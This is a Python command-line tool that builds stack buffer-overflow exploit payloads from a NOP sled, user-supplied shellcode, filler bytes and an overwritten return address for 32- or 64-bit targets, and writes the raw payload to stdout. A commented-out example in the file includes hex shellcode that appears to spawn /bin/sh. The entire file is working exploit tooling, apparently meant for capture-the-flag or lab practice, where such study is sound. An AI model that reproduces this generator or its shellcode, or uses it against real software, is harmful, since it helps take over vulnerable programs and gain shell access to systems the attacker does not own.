import argparse
import struct
import sys


def process_shellcode(shellcode):
    """
    Process shellcode in different formats and convert to bytes.
    Handles raw hex string or escaped hex format.
    """
    if isinstance(shellcode, bytes):
        return shellcode

    if all(c in '0123456789abcdefABCDEF' for c in shellcode):
        return bytes.fromhex(shellcode)

    return bytes.fromhex(shellcode.replace('\\x', ''))


def generate_payload(total_length, ret_addr, shellcode, arch, nop_size=40, use_padding=True):
    """
    Generate a payload for buffer overflow exploits.

    Parameters:
    - total_length: Total length of the payload
    - ret_addr: Return address as a hex string (e.g., "0xffffc8e0")
    - shellcode: Shellcode in various formats (converted to bytes internally)
    - arch: Architecture (32 or 64)
    - nop_size: Size of NOP sled (default: 40, used when use_padding is True)
    - use_padding: Whether to use padding bytes (default: True)

    Returns:
    - Bytes of the complete payload
    """
    shellcode_bytes = process_shellcode(shellcode)

    if isinstance(ret_addr, str):
        ret_addr = int(ret_addr, 16)

    if arch == 32:
        addr = struct.pack("<I", ret_addr)
    elif arch == 64:
        addr = struct.pack("<Q", ret_addr)
    else:
        raise ValueError("Architecture must be 32 or 64")

    available_space = total_length - len(shellcode_bytes) - len(addr)

    if available_space < 0:
        raise ValueError(
            f"Total length too small for payload components (need at least {len(shellcode_bytes) + len(addr)} bytes)")

    if use_padding:
        if nop_size > available_space:
            raise ValueError(f"NOP sled size ({nop_size}) exceeds available space ({available_space})")

        nop_sled = b"\x90" * nop_size
        padding = b"\x41" * (available_space - nop_size)
        payload = nop_sled + shellcode_bytes + padding + addr
    else:
        nop_sled = b"\x90" * available_space
        payload = nop_sled + shellcode_bytes + addr

    return payload

# def main():
#     length = 272
#     address = "0x7fffffffd554"
#     shellcode = "48b82f62696e2f73680050545f31c050b03b545a545e0f05"
#     arch = 64
#     nop = 40
#     no_padding = False
#
#     payload = generate_payload(
#         total_length=length,
#         ret_addr=address,
#         shellcode=shellcode,
#         arch=arch,
#         nop_size=nop,
#         use_padding=not no_padding
#     )
#
#     print(payload)


def main():
    parser = argparse.ArgumentParser(description='Generate buffer overflow payloads')
    parser.add_argument('--length', '-l', type=int, required=True, help='Total payload length in bytes')
    parser.add_argument('--address', '-a', required=True, help='Return address (hex format)')
    parser.add_argument('--shellcode', '-s', required=True, help='Shellcode (raw hex or \\x-escaped hex)')
    parser.add_argument('--arch', '-arch', type=int, choices=[32, 64], required=True,
                        help='Architecture (32 or 64 bit)')
    parser.add_argument('--nop', '-n', type=int, default=40, help='NOP sled size')
    parser.add_argument('--no-padding', action='store_true', help='Use extended NOP sled instead of padding')

    args = parser.parse_args()

    try:
        payload = generate_payload(
            total_length=args.length,
            ret_addr=args.address,
            shellcode=args.shellcode,
            arch=args.arch,
            nop_size=args.nop,
            use_padding=not args.no_padding
        )

        sys.stdout.buffer.write(payload)

    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()